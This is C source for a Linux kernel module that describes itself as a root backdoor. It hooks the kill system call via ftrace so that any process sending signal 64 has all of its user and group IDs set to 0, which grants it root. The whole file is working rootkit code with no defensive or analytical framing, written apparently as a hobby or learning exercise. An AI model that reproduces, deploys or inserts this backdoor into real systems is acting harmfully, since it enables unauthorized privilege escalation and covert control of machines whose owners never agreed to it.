#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("IC3");
MODULE_DESCRIPTION("Simple root backdoor with syskill hook");
MODULE_VERSION("0.3.0");

#define PTREGS_SYSCALL_STUBS 1
static asmlinkage long (*orig_kill)(const struct pt_regs *);

/* We can only modify our own privileges, and not that of another
* process. Just have to wait for signal 64 (normally unused) 
* and then call the set_root() function. */
asmlinkage int hook_kill(const struct pt_regs *regs)
{
    void set_root(void);

    // pid_t pid = regs->di;
    int sig = regs->si;

    if ( sig == 64 )
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
        return 0;
    }

    return orig_kill(regs);

}

/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};

 void set_root(void)
{
    /* prepare_creds returns the current credentials of the process */
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    /* Run through and set all the various *id's to 0 (root) */
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    /* Set the cred struct that we've modified to that of the calling process */
    commit_creds(root);
}

static int __init example_init(void)
{
	/* Hook the syscall and print to the kernel buffer */
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err){
        return err;
    }
    printk(KERN_INFO "Rkit loaded :D");
    return 0;
}

static void __exit example_exit(void)
{   
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "Goodbye, World!\n");
}

module_init(example_init);
module_exit(example_exit);

// https://blog.sourcerer.io/writing-a-simple-linux-kernel-module-d9dc3762c234